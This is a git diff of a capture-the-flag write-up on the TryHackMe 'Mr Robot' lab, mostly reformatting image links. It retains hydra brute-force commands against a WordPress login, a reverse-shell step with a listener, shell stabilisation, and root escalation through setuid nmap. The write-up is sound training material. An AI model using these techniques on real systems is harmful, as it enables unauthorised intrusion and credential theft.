@@ -91,25 +91,16 @@ fsocity.dic - It is a tailored wordlist. Possible fuzzable parameters and can be
  wget 10.10.87.211/fsocity.dic
  uname -u fsocity.dic > cred.dic
 ```
-/key-1-of-3.txt link - If we visit this link, we find us the first key. Submit it.
-
-------
-IMG - key_1.png
------- 
-
+/key-1-of-3.txt link - If we visit this link, we find us the first key. Submit it. \
 Checking the page source for the main page, we get an easter egg.
 
-------
-IMG - 80_src.png
--------
+![](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr_Robot_CTF/images/80_src.png)
     
 Lastly, we can check for the what are the accepatble extensions for the files. Thus, we can be sure that the background loading script can process a .php script for example. This allows us to tailor the malicious payloads that we can upload.\
-_.php_ loads perfectly  while other extensions like _.html_ go in an infinite loop. This means that php files are acceptable. We can inject malicious php scripts later.\
+_.php_ loads perfectly  while other extensions like _.html_ go in an infinite loop. This means that php files are acceptable. We can inject malicious php scripts later.
 
-------
-IMG - valid_ext_php.png
---------
-
+![](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr_Robot_CTF/images/valid_ext_php.png)
+\
 Let's look at the results that came back from gobuster now. We included the -x option for php extension which we enumerated earlier.\
 The standard command is as follows.The various options are as
 1. dir : It specified the directory listing brute force.
@@ -119,7 +110,8 @@ The standard command is as follows.The various options are as
 
 ```bash
 $ gobuster dir -u http://10.10.87.211/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php
-```
+``` 
+\
 **OUTPUT**
 ```bash
 ===============================================================
@@ -157,18 +149,17 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 /robots (Status: 200)
 /dashboard (Status: 302)
 ```
-We see that there are few other easter eggs when you try to find out the documents that usullay contain information such as version or release date./readme and /license are two such examples
 
------
-IMG - readme_dir.png & license.png
-------
+We see that there are few other easter eggs when you try to find out the documents that usullay contain information such as version or release date./readme is such an example. I leave the rest upto you to find.
 
+![](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr_Robot_CTF/images/readme_dir.png)
+\
 The other picular thing is that most of the other pages like /image are **Forbidden** and others lead to the standard _/wp-login_ page. It ensures that 	  to move further we need _valid credentials_ to login into the wordpress site.
 
-`````
-IMG - forbidden.png & login_dir_302_wp-login.png
-`````
-
+![](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr_Robot_CTF/images/forbidden.png)
+\
+![](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr_Robot_CTF/images/login_dir_302_wp-login.png)
+\
 As this is a wordpress site, we can launch a *wpscan* in the background. Always good to have some enumeration running in the backgorund. Rabbit holes are deep man!! DOn't fall too deep.\
 We are doing an agressive serach for possible plugins, themes and databases.\
 
@@ -186,9 +177,8 @@ IMG - burp.png
 
 Let's enumerate the user first. We see that an **invalid user** can be distingused by the reflective response. We can include this in our hydra search.
 
-`````
-IMG - invalid_usr.png
-`````
+![](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr_Robot_CTF/images/invalid_usr.png)
+\
 Let's run hydra now!! The various options are\
 1. -T : Threads. Default set to 16. One can increase it to reduce fuzz time. I set it to 100.
 2. -L : List of username to enumerate. Will be injected at the _^USER^_ handle.
@@ -199,6 +189,7 @@ Let's run hydra now!! The various options are\
 ```bash
 $ hydra -T100 -f -L www/downloads/cred.dic -p passwd -o userenum.txt 10.10.87.211 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.87.211%2Fwp-admin%2F&testcookie=1:F=Invalid username"
 ```
+\
 **RESULT**
 ```bash
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-12 00:01:32
@@ -220,6 +211,7 @@ We use some different options like
 $ hydra -T100 -f -l elliot -P www/downloads/cred.dic 10.10.87.211 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&re
 direct_to=http%3A%2F%2F10.10.87.211%2Fwp-admin%2F&testcookie=1:S=302"
 ```
+\
 **RESULT**
 ```bash
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-12 00:45:26
@@ -235,17 +227,13 @@ We find valid credentails as **elliot:ER28-0652**. We can now login using this.
 
 We are greeted with a standard _/wp-admin_ page and we are logged in as Elliot Alderson. We will move around and see if we find something that can get us a shell.
 
--------
-IMG - wp_admin.png
---------
-
+![](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr_Robot_CTF/images/wp_admin.png)
+\
 We see that the various php templates of the various _Themes_ in the _Appearance_ section are mutable. On the other hand the _wpscan enumeration__ finds us that these files can then be invoked from going to /wp-content/themes/$THEME_NAME/$PHP_FILE. Enumeration for the win!! \
 Note: One can also modify the _Plugin_ section and achieve the reverse shell. I'll leave the work to you. \
 
-------
-IMG - 404_php.png
--------
-
+![](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr_Robot_CTF/images/404_php.png)
+\
 **WPSCAN OUTPUT**
 ```bash
 [32m[+][0m Checking Theme Versions (via Passive and Aggressive Methods)
@@ -262,7 +250,7 @@ IMG - 404_php.png
 ```
 
 We can now replace contents of a file like _404.php_ with reverse shell code. We start a listner on our side and invoke the modified file. \
-I am using standard php reverse shell script from pentestmonkey(https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) to repace teh content of the 404.php page. The only thing to change is the _IP and PORT_ on which you are listening. A person just starting out will find all the scripts rather useful.
+I am using standard php reverse shell script from pentestmonkey(https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) to repace teh content of the 404.php page. The only thing to change is the _IP and PORT_ on which you are listening. A person just starting out will find all the scripts rather useful.\
 
 **SCRIPT**
 ```php
@@ -398,10 +386,8 @@ listening on [any] 5555 ...
 ```
 We get a blank page and also reverse shell on our listener. The page is still loading as it is waiting for our shell process to die.
 
-------
-IMG - rev_shell_req.png
--------
-
+![](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr_Robot_CTF/images/rev_shell_req.png)
+\
 **REVERSE SHELL**
 
 ```bash
@@ -416,16 +402,16 @@ $ which python
 ```
 
 We can now stabilize the shell using the _Python pty module_ to get a basic bash shell and then export some of our _stty options_ to upagarde to a full shell. It is a common way and the steps can be seen as
-1. python -c 'import pty; pty.spawn("/bin/bash")' : **Get a basic pty bash shell. Has no autocomplete, clear or movement.**
-2. CTRL-Z : **Background pty shell**
-3. stty -a | head -n1 : **To display the rows and columns on our host shell.**
-4. stty raw -echo : **raw option send our command straight to the pty shell and -echo outputs every input command**
-5. fg : **foreground the pty shell**
-6. export HOME=$HOME_DIR : **set home directory to your requirements.**
-7. export SHELL=/bin/bash : **set SHELL to available one. Most of the time /bin/bash or /bin/sh.**
-8. export TERM=xterm-256color : **set TERMINAL to standard xterm or xterm-256color**
-9. stty rows X columns Y : **Finally set the rows and columns size to the output in step 3.**
- 
+1. **python -c 'import pty; pty.spawn("/bin/bash")'** : Get a basic pty bash shell. Has no autocomplete, clear or movement.
+2. **CTRL-Z** : Background pty shell
+3. **stty -a | head -n1** : To display the rows and columns on our host shell.
+4. **stty raw -echo** : raw option send our command straight to the pty shell and -echo outputs every input command
+5. **fg** : foreground the pty shell
+6. **export HOME=$HOME_DIR** : set home directory to your requirements.
+7. **export SHELL=/bin/bash** : set SHELL to available one. Most of the time /bin/bash or /bin/sh.
+8. **export TERM=xterm-256color** : set TERMINAL to standard xterm or xterm-256color
+9. **stty rows X columns Y** : Finally set the rows and columns size to the output in step 3.
+\ 
 **RESULT**
 ```bash
 $ python -c 'import pty; pty.spawn("/bin/bash")'
@@ -442,7 +428,7 @@ daemon@linux:/$ stty rows 46 columns 187
 ```
 We now have a stabilized shell and thus we can now go and enumerate the system.
 
-# LOCAL ENUMERATON
+### LOCAL ENUMERATON
 
 Let's look around. We can use the _find_ cmmand. We see that the 2nd key exits inhome directory of the user __robot__. But we see that it can only be read by the owner robot. So, we need to pivot to this user. We also find the backup of robot's raw md5 password. We can crack this password using __hashcat__.
 
@@ -474,7 +460,6 @@ MODE: 0
 TYPE: MD5
 HASH: 8743b52063cd84097a65d1633f5c74f5
 PASS: hashcat 
-
 ......     
 ```
 
@@ -514,7 +499,7 @@ Started: Thu Nov 12 21:40:46 2020
 Stopped: Thu Nov 12 21:41:14 2020
 ```
 	
-3. We can use the above creds to pivot to robot user. Now we can see the 2nd key and submit it.
+We can use the above creds to pivot to robot user. Now we can see the 2nd key and submit it.
 
 ```bash
 robot@linux:~$ whoami
@@ -522,21 +507,13 @@ robot
 robot@linux:~$ cat key-2-of-3.txt 
 ```
 
-# PRIV EXEC
+### PRIVILEGE ESCALATION
 
 Lastly, we have too look for a path to privesec ourseleves to the root user. For this I am using **Linpeas script**. It is basically an upgrade to the **Linenum script** with color coded output for severity and cool animation. This is the part of _privilege-escalation-awesome-scripts-suite_ which has one for windows too(https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite). \
 I did a full scan usinfg the -a option. One can go and read the color output using.\
 
 ```bash
-less -r outputfile
-```
-
-```bash
-~/www/uploads$ ls
-linpeas.sh
-~/www/uploads$ python3 -m http.server 
-Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-10.10.100.64 - - [12/Nov/2020 21:52:41] "GET /linpeas.sh HTTP/1.1" 200 -
+less -r output_file
 ```
 
 ```bash
@@ -562,7 +539,7 @@ drwxr-xr-x 14 root  root     480 Nov 13 02:15 ..
 -rw-rw-r--  1 robot robot  91965 Nov 13 03:02 local_enum.txt
 ```
 
-While going through the output we see an intresting binary _/usr/local/bin/nmap_. It has setuid and the owner is root. In simplest terms, execution of this file will gives temporary permissions to our user(robot) to run the program/file with the permission of the file owner -root.
+While going through the output we see an intresting binary _/usr/local/bin/nmap_. It has setuid and the owner is root. In simplest terms, execution of this file will gives temporary permissions to our user(robot) to run the program/file with the permission of the file owner root.
 
 ```bash
 ====================================( Interesting Files )=====================================
@@ -589,10 +566,8 @@ While going through the output we see an intresting binary _/usr/local/bin/nmap_
 
 So, to exploit this let us visit to __GTFOBINS__(https://gtfobins.github.io/) which provide us with Unix binaries' expoits to bypass system security. We can search for _nmap_.
 
-------
-IMG - sudo.png
---------
-
+![](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr_Robot_CTF/images/sudo.png)
+\
 So, let's now use take advantage of the nmap's interactive mode and privesec to root. We find the last key in the /root directory. We can submit this and mark this box as complete !!
 
 ```bash
@@ -609,9 +584,3 @@ firstboot_done  key-3-of-3.txt
 ~# cat key-3-of-3.txt
 ```
  
-
-
-
-
-
-
